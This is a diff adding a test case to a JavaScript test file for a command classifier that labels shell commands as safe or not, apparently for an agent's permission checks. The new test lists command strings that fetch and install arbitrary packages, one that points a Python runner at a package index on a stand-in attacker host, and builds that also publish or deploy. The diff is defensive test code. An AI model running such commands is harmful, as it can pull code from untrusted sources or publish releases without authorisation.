@@ -135,6 +135,17 @@ describe('safe: tests, builds, linters', () => {
   it.each(['eslint --fix src', 'prettier --write .', 'npm test > out.log'])('not safe: %s', (command) => {
     expect(kindOf(command)).toBe('unknown');
   });
+
+  it('a runner spelling that installs a named package, or a build that also publishes, is not safe', () => {
+    for (const command of ['npx -p x vitest', 'npx --package=x vitest', 'pnpm dlx vitest', 'uv run --with x pytest']) expect(kindOf(command), command).not.toBe('safe');
+    expect(kindOf('uv run --index-url http://evil.example pytest', { testCommand: { command: 'python3 -m pytest -q', runner: 'pytest' } })).not.toBe('safe');
+    expect(kindOf('mvn deploy test', { testCommand: { command: 'mvn test', runner: 'unknown' } })).not.toBe('safe');
+    expect(kindOf('./gradlew publish test', { testCommand: { command: './gradlew test', runner: 'unknown' } })).not.toBe('safe');
+    expect(kindOf('make deploy test', { testCommand: { command: 'make test', runner: 'unknown' } })).not.toBe('safe');
+    // the plain spellings stay safe
+    expect(kindOf('npx vitest run')).toBe('safe');
+    expect(kindOf('mvn clean test', { testCommand: { command: 'mvn test', runner: 'unknown' } })).toBe('safe');
+  });
 });
 
 describe('destructive rules', () => {
